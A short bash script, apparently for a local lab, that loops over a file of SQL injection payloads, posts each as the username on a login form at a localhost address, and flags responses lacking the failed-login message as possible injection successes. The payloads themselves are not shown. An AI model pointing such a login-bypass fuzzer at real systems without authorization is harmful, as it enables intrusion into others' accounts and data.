#!/bin/bash

# Target URL
URL="http://127.0.0.1:9001/"

# Payload file
PAYLOAD_FILE="sql_payloads.txt"

# Check if payload file exists
if [[ ! -f "$PAYLOAD_FILE" ]]; then
    echo "Error: '$PAYLOAD_FILE' not found!"
    exit 1
fi

echo "[+] Starting SQL Injection Test against $URL..."
echo "-------------------------------------------"

# Loop through each payload
while IFS= read -r payload; do
    echo "[*] Testing: $payload"

    # Send request with payload in the username field and 'admin' as password
    response=$(curl -s -X POST -d "username=$payload&password=admin&submit=submit" "$URL")

    # Check if the response does NOT contain the error message
    if [[ ! "$response" =~ "Invalid username or password" ]]; then
        echo "[!] Possible SQL Injection Success with payload: $payload"
        echo "-------------------------------------------"
    fi
done < "$PAYLOAD_FILE"

echo "[+] Testing Completed!"
